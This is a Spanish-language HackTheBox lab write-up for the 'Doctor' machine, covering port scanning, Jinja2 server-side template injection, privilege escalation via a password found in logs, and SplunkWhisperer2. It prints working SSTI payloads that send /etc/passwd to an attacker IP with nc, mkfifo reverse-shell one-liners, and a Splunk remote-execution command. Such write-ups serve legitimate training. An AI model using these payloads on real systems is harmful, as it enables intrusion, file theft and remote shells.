<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<link rel="icon" href="/assets/images/lanz2.png">

<title>HackTheBox - Doctor</title>

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Doctor | Sh0x blog</title>
<meta name="generator" content="Jekyll v3.8.6" />
<meta property="og:title" content="HackTheBox - Doctor" />
<meta name="author" content="lanz" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Máquina Linux nivel fácil. Sencilla, pero algo inquietante al inicio, jugaremos con inyección en templates, los logs nos hablarán y romperemos Splunk montando servidores fake por todos lados para ejecutar comandos." />
<meta property="og:description" content="Máquina Linux nivel fácil. Sencilla, pero algo inquietante al inicio, jugaremos con inyección en templates, los logs nos hablarán y romperemos Splunk montando servidores fake por todos lados para ejecutar comandos." />
<link rel="canonical" href="http://localhost:4000/htb/doctor" />
<meta property="og:url" content="http://localhost:4000/htb/doctor" />
<meta property="og:site_name" content="Sh0x blog" />
<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278banner.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-02-06T00:00:00-08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278banner.png" />
<meta property="twitter:title" content="HackTheBox - Doctor" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-02-06T00:00:00-08:00","datePublished":"2021-02-06T00:00:00-08:00","description":"Máquina Linux nivel fácil. Sencilla, pero algo inquietante al inicio, jugaremos con inyección en templates, los logs nos hablarán y romperemos Splunk montando servidores fake por todos lados para ejecutar comandos.","headline":"HackTheBox - Doctor","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/doctor"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/doctor"}</script>
<!-- End Jekyll SEO tag -->

    
<link href="/assets/css/prism.css" rel="stylesheet">

<link href="/assets/css/theme.css" rel="stylesheet">

<script src="/assets/js/jquery.min.js"></script>

</head>




<body>
	<!-- defer loading of font and font awesome -->
	<noscript id="deferred-styles">
		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
	</noscript>


<!-- Begin Sidebar Navigation
================================================== -->

<div class="sidebar">    
</div>   
<div class="nav-icon">
    <div class="hamburger-bar"></div>
</div>
<div id="blackover-nav" class="blackover"></div>
<nav id="menu">
    <ul>
        <h3>El tiempo a destiempo</h3>
        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
        <li><a href="/categories#article">Artículos</a></li>
        <li><a href="/categories#htb">HackTheBox</a></li>
        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
    </ul>   
</nav>

<script src="/assets/js/lunr.js"></script>

<style>
    
</style>

<div class="wrap-search">
    <div class="d-flex align-items-center ml-auto">
        <i class="fas fa-search show-search"></i>
        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
        </form>
    </div>
</div>

<div id="lunrsearchresults">
    <ul></ul>
</div>

<script src="/assets/js/lunrsearchengine.js"></script>


<!-- End Sidebar Navigation
================================================== -->

<div class="site-content ">

<div class="container">

    <!-- Site Logo/Name
    ================================================== -->
   
    <a class="navbar-brand" href="/">
        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
    </a>  
   

    <!-- Site Tag
    ================================================== -->
    

    <!-- Content
    ================================================== -->
    <div class="main-content">
        <div class="entry-header">
    <!-- Post Title -->
    <h1 class="posttitle">HackTheBox - Doctor</h1>
    <!-- Author & Date  Box -->
    
    
    <div class="d-flex align-items-center mt-4">
        <div>
            
            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
            
        </div>            
        <div>
        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
        <span class="post-date"><time class="post-date" datetime="2021-02-06">06 Feb 2021</time></span>           
        
        </div>            
    </div>
    
</div>

<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->


<!-- Featured Image -->

<div class="entry-featured-image">
    
    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278banner.png" alt="HackTheBox - Doctor">
    
</div>


<!-- Content -->
<!-- Post, Page Content
================================================== -->
<div class="article-post">
    <!-- Toc if any -->
    
    <!-- End Toc -->
    <p>Máquina Linux nivel fácil. Sencilla, pero algo inquietante al inicio, jugaremos con inyección en templates, los logs nos hablarán y romperemos <code>Splunk</code> montando servidores fake por todos lados para ejecutar comandos.</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/doctorHTB.png" alt="doctorHTB" /></p>

<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>

<p>Creador: <a href="https://www.hackthebox.eu/profile/94858">egotisticalSW</a>.</p>

<p>Bueno bueno, inicio caótico, empezaremos jugando con el archivo <code>/etc/hosts</code>, encontraremos un login panel que está siendo ejecutado con la librería <code>Werkzeug</code> de <code>Python</code>. Después nos percataremos de una inyección por templates (<code>Server Side Template Injection</code>), en este caso el marco <code>Jinja2</code>. Usaremos esto para ejecutar comandos en el sistema como el usuario <code>web</code>, así mismo obtendremos una reverse Shell (:</p>

<p>Estando dentro y enumerando los logs de la máquina nos encontraremos con una contraseña para un servicio que tenemos en el puerto <code>8089</code> (Splunk) y su usuario <code>shaun</code> (que también es usuario del sistema). Con esa contraseña tendremos acceso a la máquina y al servicio, 2x1 :)</p>

<p>En internet nos encontraremos con un exploit que aprovecha la creación de un servidor falso en nuestra máquina para ejecutar comandos mediante el servicio <code>Splunk</code>. Con él obtendremos una Shell como el usuario <code>root</code>.</p>

<p>He creado un script para la generación del usuario en la web, nos logea, crea el post malicioso y hace el despliegue de la Reverse Shell. Hechenle un ojito si quieren ;)</p>

<ul>
  <li><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/doctor/createuserdoctors.py">createuserdoctors.py</a></li>
</ul>

<p>…</p>

<h4 id="clasificación-de-la-máquina">Clasificación de la máquina.</h4>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>

<p>Neutral con puntos reales.</p>

<blockquote>
  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
</blockquote>

<p>…</p>

<h3 id="fases">Fases</h3>

<ol>
  <li><a href="#enumeracion">Enumeración</a>.</li>
  <li><a href="#explotacion">Explotación</a>.</li>
  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
</ol>

<p>…</p>

<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>

<p>Como siempre empezamos realizando un escaneo de puertos sobre la maquina para saber que servicios esta corriendo.</p>

<pre><code class="language-bash">–» nmap -p- --open -v 10.10.10.209
</code></pre>

<p>En este caso vamos a agregarle el parametro <code>-T</code> para hacer el escaneo más rapido.</p>

<pre><code class="language-bash">–» nmap -p- --open -v -T5 10.10.10.209
</code></pre>

<p>Aún sigue lento, cambiemos el <code>-T</code> por <code>--min-rate</code>:</p>

<pre><code class="language-bash">–» nmap -p- --open -v --min-rate=2000 10.10.10.209 -oG initScan
</code></pre>

<p>Perfecto va mucho más rapido.</p>

<blockquote>
  <p><strong>Es importante hacer un escaneo total, sin cambios ni parametros de más, asi vaya lento, que nos permita ver si obviamos/pasamos algún puerto</strong>.</p>
  <pre><code class="language-sh">–» nmap -p- --open -v -Pn 10.10.10.203 -oG totalScan
</code></pre>
</blockquote>

<table>
  <thead>
    <tr>
      <th>Parámetro</th>
      <th style="text-align: left">Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p-</td>
      <td style="text-align: left">Escanea todos los 65535</td>
    </tr>
    <tr>
      <td>–open</td>
      <td style="text-align: left">Solo los puertos que están abiertos</td>
    </tr>
    <tr>
      <td>-Pn</td>
      <td style="text-align: left">Evita que realice Host Discovery, como <strong>ping</strong> (P) y el <strong>DNS</strong> (n)</td>
    </tr>
    <tr>
      <td>-T</td>
      <td style="text-align: left">Forma de escanear super rapido, (hace mucho ruido, pero al ser un entorno controlado no nos preocupamos)</td>
    </tr>
    <tr>
      <td>–min-rate</td>
      <td style="text-align: left">Indica que no queremos hacer peticiones menores al número que pongamos</td>
    </tr>
    <tr>
      <td>-v</td>
      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
    </tr>
    <tr>
      <td>-oG</td>
      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
    </tr>
  </tbody>
</table>

<pre><code class="language-bash">–» cat initScan 
# Nmap 7.80 scan initiated Wed Dec  9 25:25:25 2020 as: nmap -p- --open -v --min-rate=2000 -oG initScan 10.10.10.209
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.209 ()   Status: Up
Host: 10.10.10.209 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: filtered (65533)
# Nmap done at Wed Dec  9 25:25:25 2020 -- 1 IP address (1 host up) scanned in 91.31 seconds
</code></pre>

<p>Muy bien, tenemos los siguientes servicios:</p>

<table>
  <thead>
    <tr>
      <th>Puerto</th>
      <th style="text-align: left">Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>22</td>
      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong>: Conexion remota segura mediante una shell</td>
    </tr>
    <tr>
      <td>80</td>
      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto">HTTP</a></strong>: Servidor web</td>
    </tr>
  </tbody>
</table>

<p>Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello obtenemos información más detallada de cada servicio:</p>

<pre><code class="language-bash">–» nmap -p 22,80 -sC -sV 10.10.10.209 -oN portScan
</code></pre>

<table>
  <thead>
    <tr>
      <th>Parámetro</th>
      <th style="text-align: left">Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p</td>
      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
    </tr>
    <tr>
      <td>-sC</td>
      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
    </tr>
    <tr>
      <td>-sV</td>
      <td style="text-align: left">Nos permite ver la versión del servicio</td>
    </tr>
    <tr>
      <td>-oN</td>
      <td style="text-align: left">Guarda el output en un archivo</td>
    </tr>
  </tbody>
</table>

<pre><code class="language-bash">–» cat portScan 
# Nmap 7.80 scan initiated Wed Dec  9 25:25:25 2020 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.209
Nmap scan report for 10.10.10.209
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  9 25:25:25 2020 -- 1 IP address (1 host up) scanned in 19.24 seconds
</code></pre>

<p>Tenemos:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Puerto</th>
      <th style="text-align: left">Servicio</th>
      <th style="text-align: left">Versión</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">22</td>
      <td style="text-align: left">SSH</td>
      <td style="text-align: left">OpenSSH 8.2p1 Ubuntu</td>
    </tr>
    <tr>
      <td style="text-align: left">80</td>
      <td style="text-align: left">HTTP</td>
      <td style="text-align: left">Apache httpd 2.4.41</td>
    </tr>
  </tbody>
</table>

<p>…</p>

<p>El escaneo total (totalScan) me mostro un nuevo puerto y el tipo de servicio era <code>unknown</code>, haciendo el escaneo de versiones y scripts, obtuvimos:</p>

<pre><code class="language-bash">...
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>

<table>
  <thead>
    <tr>
      <th>Puerto</th>
      <th style="text-align: left">Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>8089</td>
      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Splunk">Splunk</a></strong>: Realiza busqueda, analisis y monitoreo de macrodatos, todo mediante una interfaz grafica</td>
    </tr>
  </tbody>
</table>

<p>Pero validando en la web <code>http://10.10.10.209:8089/</code> sale error, posiblemente por el <code>SSL</code>, sigamos validando a ver que encontramos.</p>

<p>…</p>

<h4 id="puerto-80">• Puerto 80 <a href="#puerto-80">⌖</a></h4>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctordefault.png" alt="278pagedoctordefault" /></p>

<p>Enumeremos a ver que podemos encontrar…</p>

<pre><code class="language-bash">–» cat webScan 
# Nmap 7.80 scan initiated Wed Dec  9 10:34:55 2020 as: nmap -p 80 --script=http-enum -oN webScan 10.10.10.209
Nmap scan report for 10.10.10.209
Host is up (0.19s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'

# Nmap done at Wed Dec  9 10:35:25 2020 -- 1 IP address (1 host up) scanned in 30.40 seconds
</code></pre>

<p>Realizando un fuzz de directorios con nmap, mediante el script <code>http-enum</code> no vemos rutas escondidas u ocultas… Sigamos.</p>

<p>Encontramos:</p>

<ul>
  <li>Posible dominio: <code>doctors.htb</code></li>
  <li>Posibles usuarios: <code>Jade Guzman</code>, <code>Hannan Ford</code>, <code>James Wilson</code> y <code>Admin</code>.</li>
</ul>

<p>Probemos colocando en el <code>/etc/hosts</code> el dominio, para que cuando hagamos una petición hacia <code>10.10.10.209</code>, nos resuelva hacia <code>doctors.htb</code>.</p>

<pre><code class="language-bash">–» cat /etc/hosts
...
10.10.10.209  doctors.htb
...
</code></pre>

<p>Ahora validemos en la web:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorshtb.png" alt="278pagedoctorshtb" /></p>

<p>Muy bien, tenemos un login panel (que tambien nos permite registrarnos) en el puerto <code>80</code>, veamos si cambio algo ahora con el nuevo puerto: <code>8089</code>.</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorsSSL.png" alt="278pagedoctorsSSL" /></p>

<p>Perfecto, tenemos la interfaz de <code>splunk</code> con algunas rutas, 2 de ellas funcionan (nos piden usuario y contraseña para entrar) y las otras 2 pues no :P</p>

<p>…</p>

<p>Validando el login panel ninguna credencial por default es valida, usando <code>whatweb</code> nos indica:</p>

<pre><code class="language-bash">–» whatweb http://doctors.htb/login?next=%2F
http://doctors.htb/login?next=%2F [200 OK] Bootstrap[4.0.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/1.0.1 Python/3.8.2], IP[10.10.10.209], JQuery, PasswordField[password], Python[3.8.2], Script, Title[Doctor Secure Messaging - Login], Werkzeug[1.0.1]
</code></pre>

<p>Esta usando una libreria de <code>Python</code> llamada <code>[Werkzeug en su versión 1.0.1](https://werkzeug.palletsprojects.com/en/1.0.x/)</code> que permite entre otras cosas usar WSGI (Interfaz de puerta de enlace de un servidor web) para que los servidores reenvien solicitudes a aplicaciones web.</p>

<ul>
  <li>Info: <a href="https://codigofacilito.com/articulos/wsgi-python">Codigo Facilito / WSGI</a></li>
</ul>

<p>Buscando vulnerabilidades no existen aún publicas, probemos a registrarnos:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorscreateuser.png" alt="278pagedoctorscreateuser" /></p>

<pre><code>Your account has been created, with a time limit of twenty minutes!
</code></pre>

<p>Entramos y tenemos:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorshomeauth.png" alt="278pagedoctorshomeauth" /></p>

<p>Si hacemos un reconocimiento de directorios con <a href="https://github.com/maurosoria/dirsearch">dirsearch</a> tenemos:</p>

<pre><code class="language-bash">–» dirsearch.py -u http://doctors.htb -t 50 -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt --cookie "session=.eJwlzjFuA0EIheG7TJ0CGGDAl1kxOyBbkRJp166i3N0bpXy_XvH9tK2OPO_t9jxe-dG2x2q3NgtzYBAoa7pNMfauw3Aim2o49iWLaOVwGcmBEVXQ5XpZQo9gItNIcFSB6JIyQXWH5c68rwIiqgE-S4t52aCeITWnDylpF-R15vGvoWvu51Hb8_szv64wcFo4wWRDNyfOJIfyhY5-ueKvs0T7fQMhET1g.X9EN1A.AaNm4WThP6qM6V-ogiPoLgMafAU" -q
</code></pre>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Arg</th>
      <th style="text-align: left">Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">-t</td>
      <td style="text-align: left">Hilos con los que queremos que haga el proceso</td>
    </tr>
    <tr>
      <td style="text-align: left">-q</td>
      <td style="text-align: left">Para que simplemente nos muestre el reporte</td>
    </tr>
  </tbody>
</table>

<pre><code>302 -  217B  - http://doctors.htb/logout  -&gt;  http://doctors.htb/home
302 -  217B  - http://doctors.htb/register  -&gt;  http://doctors.htb/home
302 -  217B  - http://doctors.htb/login  -&gt;  http://doctors.htb/home
200 -    3KB - http://doctors.htb/home
200 -  101B  - http://doctors.htb/archive
200 -    4KB - http://doctors.htb/account
</code></pre>

<p>Con el escaneo (y si vemos el codigo fuente (<code>CTRL + U</code>) de la pagina, vemos la referencia hacia <code>/archive</code>:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorsarchiveRfound.png" alt="278pagedoctorsarchiveRfound" /></p>

<p>Pero entrando a la ruta no obtenemos nada, simplemente una página blanca. Haciendo fuzz sobre esa ruta tampoco obtenemos nada… Revisando podemos crear posts y nos los guarda en la ruta <code>/user/lanz</code>, probando con el usuario <code>/admin</code> también tenemos respuesta, solo hay un post por parte de él:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorsadminpost.png" alt="278pagedoctorsadminpost" /></p>

<p>…</p>

<p>Pues veamos si el apartado para crear post es vulnerable a alguna inyección.</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorscreatepost.png" alt="278pagedoctorscreatepost" /></p>

<p>Después de estar demasiado tiempo estancado sin entender que debía hacer, ya que ninguna inyección me mostraba algo y tampoco me funcionaban las típicas sentencias blind. Me fui para el foro de la máquina, alguien decía que es una inyección extraña que trata sobre <code>Templates</code> (ya que habían muchas dudas sobre si era <code>SQLi</code>). También hablaban de <code>AllTheThings</code>, lo cual me trajo a la mente un repositorio gigante de payloads para probar, lo busque y lo encontré: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a>.</p>

<p>Primero busqué en internet <code>Template injection</code> y el resultado fue <code>Server Side Template Injection</code> (SSTi).</p>

<blockquote>
  <p>“Template engines are widely used by web applications to present dynamic data via web pages and emails.” <a href="https://portswigger.net/research/server-side-template-injection">Portswigger</a></p>
</blockquote>

<p>Profundizando encontré <a href="https://gupta-bless.medium.com/exploiting-server-side-template-injection-96d538e38539">que dependiendo el lenguaje de programación, existen tipos de Templates, por lo tanto, diferentes tipos de explotación</a>, probando y tomando en cuenta que estamos corriendo una librería de <code>Python</code> podemos tener los siguientes Templates, <strong>Jinja2, Django, Mako</strong>.</p>

<p>…</p>

<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>

<p>Pero testeando con la página no veía ningún indicio de que algo estuviera pasando al <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">probar los 3 tipos</a>. Entre de nuevo en “no sé que probar”, de un momento a otro recordé a <code>/archive</code> (la rua que habíamos encontrado en el fuzz y como comentario en el código HTML), así que la abrí.</p>

<p>En ese momento había creado un post probando <code>{{7*7}}</code>, el cual si veíamos en algún lado el número <code>49</code>, quiere decir que tendríamos nuestra inyección con <code>Jinja2</code>.</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctorsnewpost1.png" alt="278pagedoctorsnewpost1" /></p>

<p>Revisando el fuente de <code>/archive</code> encontramos lo que buscabamos (:</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctors_injA_found.png" alt="278pagedoctors_injA_found" /></p>

<p>Bien, al probar los dos campos del <code>post</code>, el que nos genera la inyección es el titulo, asi que podemos intentar ejecución de comandos en el sistema:</p>

<ul>
  <li><a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">Server Side Template Injection with Jinja2</a>.</li>
</ul>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctors_injA_idYwhoami_req.png" alt="278pagedoctors_injA_idYwhoami_req" /></p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctors_injA_idYwhoami_res.png" alt="278pagedoctors_injA_idYwhoami_res" /></p>

<p>Perfecto, tenemos ejecución de comandos en el sistema como <code>web</code>, intentemos obtener el archivo <code>/etc/passwd</code>.</p>

<p>Ponemos en el titulo del post:</p>

<pre><code class="language-py">{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd | nc 10.10.14.83 4433')['read']()}}
</code></pre>

<p>Nos ponemos en escucha por el puerto 4433:</p>

<pre><code class="language-bash">–» nc -nlvp 4433
listening on [any] 4433 ...
</code></pre>

<p>Vamos a <code>/archive</code> y ejecutamos, el resultado que tenemos en consola es:</p>

<pre><code class="language-bash">connect to [10.10.14.83] from (UNKNOWN) [10.10.10.209] 55928
root:x:0:0:root:/root:/bin/bash
...
web:x:1001:1001:,,,:/home/web:/bin/bash
...
shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash 
splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
</code></pre>

<ul>
  <li><a href="https://uniwebsidad.com/libros/python/capitulo-10/modulos-de-sistema">Info sobre <code>os</code> y <code>subprocess</code></a>.</li>
</ul>

<p>Listo, pues veamos como obtener una reverse shell (:</p>

<p><strong>NOTA: —</strong></p>

<p><a href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee">Siguiendo esta guia</a>, logramos obtener el index exacto (407) de la clase <a href="https://docs.python.org/3/library/subprocess.html"><code>subprocess.Popen</code></a> :P, con el cual tambien podemos ejecutar comandos:</p>

<pre><code class="language-py">{{''.__class__.__mro__[1].__subclasses__()[407]('ls -la',shell=True,stdout=-1).communicate()}}
</code></pre>

<p><strong>— :ATON</strong></p>

<p>Para conseguir la reverse shell podemos probar con <code>netcat</code>:</p>

<pre><code class="language-py">{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('nc 10.10.14.83 4433 -e /bin/bash')['read']()}}
</code></pre>

<p>o</p>

<pre><code class="language-py">{{''.__class__.__mro__[1].__subclasses__()[407]('nc 10.10.14.83 4433 -e /bin/bash',shell=True,stdout=-1).communicate()}}
</code></pre>

<p>Pero no obtenemos respuesta, probemos con la versión antigua, pueda que esa sea la que este instalada:</p>

<pre><code class="language-py">{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10.10.14.83 4433 &gt;/tmp/f')['read']()}}
</code></pre>

<p>o</p>

<pre><code class="language-py">{{''.__class__.__mro__[1].__subclasses__()[407]('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10.10.14.83 4433 &gt;/tmp/f',shell=True,stdout=-1).communicate()}}
</code></pre>

<p>Con cualquiera de las dos obtenemos la reverse sheeeeeeeeeeeeeeeeell :)</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagedoctors_injA_revshdone.png" alt="278pagedoctors_injA_revshdone" /></p>

<p>Ahora a seguir enumerando (:</p>

<p>…</p>

<p>Cuando hicimos <code>id</code> con la inyección, vimos un grupo llamada <code>adm</code>, es interesante:</p>

<blockquote>
  <p>adm: Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group. <a href="https://wiki.debian.org/SystemGroups">Wiki Debian</a></p>
</blockquote>

<p>Lo siguiente nos da la razón, usando <code>linpeas.sh</code> encontramos esto en un archivo <strong>log</strong>:</p>

<pre><code>/home/shaun/splunk_whisperer.py:SPLUNK_PASSWORD = "Guitar123"
</code></pre>

<p>Probemos con el puerto <code>8089</code> (donde esta el servicio <code>Splunk</code>) las credenciales: <code>shaun:Guitar123</code>.</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagesplunk_servicesin_shaun.png" alt="278pagesplunk_servicesin_shaun" /></p>

<p>Perfecto, estamos dentro…</p>

<p>(Casi me pasa lo mismo que con la máquina <code>Cache</code>, en la que encuentro una contraseña de otro servicio y no lo pruebo como contraseña de sistema y me pongo a enumerar y enumerar, después de tener todo ante mí :P):</p>

<pre><code class="language-bash">web@doctor:~$ su shaun
su shaun
Password: Guitar123

shaun@doctor:/home/web$ whoami
whoami
shaun
shaun@doctor:/home/web$ id
id
uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
shaun@doctor:/home/web$ 
</code></pre>

<p>Listo, démosle candela pa convertirnos en root.</p>

<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>

<p>Buscando en internet sobre <code>splunk</code> y sus posibles vulnerabilidades, encontramos un repositorio con un exploit interesante que crea un servidor falso en nuestra máquina, el cual hace como “ruta o comunicador” para en la mitad del proceso entrar nosotros a ejecutar comandos.</p>

<ul>
  <li><a href="https://github.com/cnotin/SplunkWhisperer2">SplunkWhisper2</a> (versión inspirada en una que hizo <a href="https://github.com/airman604/splunk_whisperer">airman604</a>).</li>
  <li>Lindo <a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">articulo</a> y el cual usaremos como guía para ejecutar comandos remotamente.</li>
</ul>

<p>Hay dos, el <code>local</code> y el <code>remoto</code>, usaremos el remoto, veamos que argumentos toma:</p>

<pre><code class="language-py">...
parser.add_argument('--scheme', default="https")
parser.add_argument('--host', required=True)
parser.add_argument('--port', default=8089)
parser.add_argument('--lhost', required=True)
parser.add_argument('--lport', default=8181)
parser.add_argument('--username', default="admin")
parser.add_argument('--password', default="changeme")
parser.add_argument('--payload', default="calc.exe")
parser.add_argument('--payload-file', default="pwn.bat")
...
</code></pre>

<p>Procedamos a cambiar a lo que tenemos:</p>

<pre><code class="language-py">...
parser = argparse.ArgumentParser()
parser.add_argument('--scheme', default="https")
parser.add_argument('--host', default="10.10.10.209")
parser.add_argument('--port', default=8089)
parser.add_argument('--lhost', default="10.10.14.83")
parser.add_argument('--lport', default=8181)
parser.add_argument('--username', default="shaun")
parser.add_argument('--password', default="Guitar123")
parser.add_argument('--payload', default="calc.exe")
parser.add_argument('--payload-file', default="pwn.bat")
...
</code></pre>

<p>Usaremos <code>--payload</code> en la ejecución para alojar nuestros comandos ;) Generemos una Reverse Shell de una, tomemos el mismo con el que accedimos a <code>web</code>.</p>

<pre><code class="language-bash">–» python3 SplunkWhisperer2/PySplunkWhisperer2/PySplunkWhisperer2_remote.py --payload "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10.10.14.83 4434 &gt;/tmp/f"
</code></pre>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278pagesplunk_Psy_revshell.png" alt="278pagesplunk_Psy_revshell" /></p>

